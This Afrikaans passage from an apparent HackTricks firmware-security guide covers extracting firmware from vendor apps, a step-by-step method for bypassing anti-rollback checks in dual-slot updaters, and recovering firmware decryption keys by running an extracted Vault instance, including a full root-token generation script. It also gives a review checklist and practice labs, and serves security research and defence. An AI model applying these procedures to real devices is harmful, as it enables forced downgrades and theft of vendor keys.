Baie verskaffers sluit volledige firmwarebeelde in hul gepaardgaande mobiele toepassings in sodat die app die toestel via Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor, onder paaie soos `assets/fw/` of `res/raw/`. Gereedskap soos `apktool`, `ghidra` of selfs gewone `unzip` laat jou toe om ondertekende beelde te onttrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Updater-only anti-rollback bypass in A/B slot designs

Sommige vendors implementeer wel ’n anti-downgrade **ratchet**, maar slegs binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n recovery-opdrag of ’n userspace OTA-agent). As die **bootloader** later slegs die image se signature/CRC nagaan en die partisie-tabel of slot-metadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmware-metadata bevat beide ’n weergawebeskrywing en ’n **security ratchet** / monotone teller.
- Die updater vergelyk die image se ratchet met ’n waarde wat in permanente berging gestoor is en verwerp ouer ondertekende images.
- Die bootloader **ontleed nie** daardie ratchet nie en verifieer slegs die header, CRC en signature voordat dit die gekose slot selflaai.
- Slotaktivering word afsonderlik in ’n partisie-tabel of per-slot-generasieteller gestoor en is **nie kriptografies gekoppel** aan die presiese firmware-digest wat gevalideer is nie.

Dit skep ’n **validate-one-image / boot-another-image**-primitief in dual-slot-stelsels. As die aanvaller die updater so kan laat optree dat slot B die volgende selflaaiteiken word met ’n huidige, ondertekende image, en slot B later voor die herlaai kan oorskryf, kan die bootloader steeds die afgegradeerde image selflaai omdat dit slegs die reeds vasgelegde slot-metadata vertrou.

Algemene misbruikpatroon:

1. Laai ’n **huidige, ondertekende** firmware na die passiewe slot op en voer die gewone validasie-/skakelroetine uit sodat die uitleg daardie slot as volgende aktief merk.
2. **Moenie nog herlaai nie**. Voer die slotvoorbereidings-/uitveerroetine weer uit in dieselfde sessie.
3. Misbruik verouderde bootstatus- of slotkeurlogika sodat die updater **dieselfde fisiese slot** uitvee wat pas bevorder is.
4. Skryf ’n **ouer, maar steeds ondertekende** firmware na daardie slot.
5. Slaan die validasieroetine wat die ratchet afdwing oor en herlaai direk.
6. Die bootloader kies die bevorderde slot, verifieer slegs die signature/integriteit en selflaai die ou image.

Dinge waarna jy moet kyk wanneer jy A/B-opdateringsimplementasies reverse-engineer:

- Slotkeuse wat afgelei word van **selflaaivlagte** wat nie ná ’n suksesvolle skakeling hernu word nie.
- ’n `prepare_passive_slot()`-agtige roetine wat ’n slot op grond van verouderde toestand uitvee, eerder as die **huidige vasgelegde uitleg**.
- ’n `part_write_layout()`-agtige funksie wat slegs ’n **generasieteller** / aktiewe vlag verhoog en nie die gevalideerde image-hash stoor nie.
- Ratchet-kontroles wat in userspace- of updater-kode geïmplementeer is, maar **nie** in ROM-/bootloader-/secure-boot-stappe nie.
- Uitvee- of recovery-roetines wat die slot as selflaaibaar gemerk laat, selfs nadat die inhoud daarvan verwyder en herskryf is.

### Kontrolelys vir die beoordeling van opdateringslogika

* Is die vervoer/identifikasie van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die toestel **weergawenommers** of ’n **monotone anti-rollback-teller** voordat dit flits?
* Word die image binne ’n secure boot-ketting geverifieer (bv. signatures wat deur ROM-kode nagegaan word)?
* Dwing die **bootloader dieselfde ratchet** af as die updater, eerder as om slegs signature/CRC na te gaan?
* Is slotaktiveringsmetadata **gekoppel aan die gevalideerde firmware-digest/weergawe**, of kan ’n slot ná bevordering gewysig word?
* Word die toestel gedwing om te herlaai nadat ’n slotskakeling slaag, of is latere opdaterings-/uitveerroetines steeds in dieselfde sessie bereikbaar?
* Voer userland-kode bykomende sanity checks uit (bv. toegelate partisiekaart, modelnommer)?
* Hergebruik *gedeeltelike* of *rugsteun*-opdateringsvloeie dieselfde validasielogika?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Gebruik die volgende kwesbare firmware-projekte as ’n beginpunt om kwesbaarhede in firmware te ontdek.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-dekripsiesleutels uit ingebedde KMS/Vault-toestand

Wanneer ’n opdateringsimage klein plaintext-metadata met ’n groot blob met hoë entropie meng, doen houertriage voordat jy enigiets brute-force:<sup>[[1]](#references)</sup>

- Dump headers, offsets en reëlgrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` dui gewoonlik op die OpenSSL `enc`-formaat: die volgende 8 grepe is die salt en die oorblywende grepe is ciphertext.
- ’n Base64-veld wat na presies `256` grepe dekodeer, is ’n sterk aanduiding dat jy na ’n RSA-2048-ciphertext kyk wat ’n ewekansige firmware-wagwoord/sessiesleutel omhul.
- Afsonderlike PGP-materiaal in dieselfde lêer beskerm dikwels slegs egtheid; moenie aanvaar dat dit die vertroulikheidsmeganisme is nie.

As die soektog na statiese sleutels (`grep`, `strings`, PEM/PGP-soektogte) misluk, reverse-engineer eerder die **operasionele dekripsiepad** as om net na private keys te soek:

- Decompileer die updater-/bestuursbinary en volg wie die geënkripteerde blob lees, watter helper/API dit ontseël en watter logiese sleutelnaam dit versoek.
- Soek in die onttrekte wortellêerstelsel na KMS-toestand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), asook unit-lêers en init-skripte.
- Behandel plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens of plaaslike KMS-auto-unseal-skripte as gelykstaande aan private-key-materiaal.

As die toestel die oorspronklike Vault-binary en stoorbackend insluit, is dit gewoonlik makliker om daardie omgewing weer te laat loop as om Vault-internals te herimplementeer:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Met root op die gekloonde KMS:

- Maak transit-sleutels slegs binne die geïsoleerde kloon exporteerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap-sleutel uit: `vault read transit/export/encryption-key/<name>`
- Probeer die herwonne RSA-sleutel met die presiese padding/hash-paar wat deur die KMS gebruik word. ’n Mislukte PKCS#1 v1.5-dekripsie en ’n mislukte verstek-OAEP-dekripsie bewys **nie** dat die sleutel verkeerd is nie; baie Vault-gesteunde vloeie gebruik OAEP met SHA-256, terwyl algemene biblioteke SHA-1 as verstek gebruik.
- As die payload met `Salted__` begin, herhaal die verskaffer se OpenSSL-KDF presies (`EVP_BytesToKey`, dikwels MD5 op verouderde toestelle) voordat jy AES-CBC-dekripsie probeer.

Dit verander “geënkripteerde firmware” in ’n algemener probleem: **herwin die toestel se operasionele sleutels, en herhaal dan die presiese unwrap- en KDF-parameters vanlyn**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kraak firmware met Claude: Vaardigheid op seniorvlak, outonomie op juniorvlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT-hacking: Die definitiewe gids tot aanvalle op die Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Ontginning van zero-days in verlate hardeware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n slimtoestel van $20 my toegang tot jou huis gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou sien jy my: nou is jy gekraak](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Ontginning van die Tesla Wall Connector via die laaipoortverbinding - Deel 2: omseiling van die anti-afgradering](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat dit flikker: Lugoor-ontginning van die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS op QEMU Deel 2: Ontfouting en regstelling](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
